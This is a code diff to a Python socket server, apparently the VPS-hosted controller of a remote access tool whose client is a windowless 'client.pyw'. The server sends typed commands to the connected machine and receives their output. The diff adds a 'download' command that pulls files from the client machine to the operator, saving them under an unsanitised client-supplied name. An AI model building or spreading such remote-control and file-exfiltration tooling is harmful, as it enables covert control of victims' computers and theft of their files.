@@ -1,6 +1,20 @@
 import socket
 import os
 
+def receive_file_from_client(conn):
+    file_name = conn.recv(1024).decode('utf-8').strip()
+    save_path = os.path.join(os.path.expanduser("~"), "Downloads", file_name)
+
+    with open(save_path, 'wb') as f:
+        while True:
+            chunk = conn.recv(1024)
+            if chunk.endswith(b'EOF'):
+                f.write(chunk[:-3])
+                break
+            f.write(chunk)
+    print(f"Fichier reçu et enregistré sous {save_path}.")
+
+
 def send_file(conn, file_path):
     if os.path.exists(file_path):
         conn.sendall(b'upload')
@@ -42,7 +56,7 @@ def prompt():
 
 def start_server():
     HOST = 'IP DE VOTRE VPS'
-    PORT = 13037 #Port vous pouvez le changer mais n'oubliez de l'ouvrir sur votre VPS en TCP
+    PORT = 13037 # Si vous le changez assurez vous de le changer également dans client.pyw
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.bind((HOST, PORT))
@@ -65,7 +79,10 @@ def start_server():
                         _, file_path = command.split(maxsplit=1)
                         send_file(conn, file_path)
                         continue
-
+                    if command.startswith("download"):
+                        conn.sendall(command.encode("utf-8"))
+                        receive_file_from_client(conn)
+                        continue
                     conn.sendall(command.encode("utf-8"))
 
                     output = conn.recv(4096).decode("utf-8")
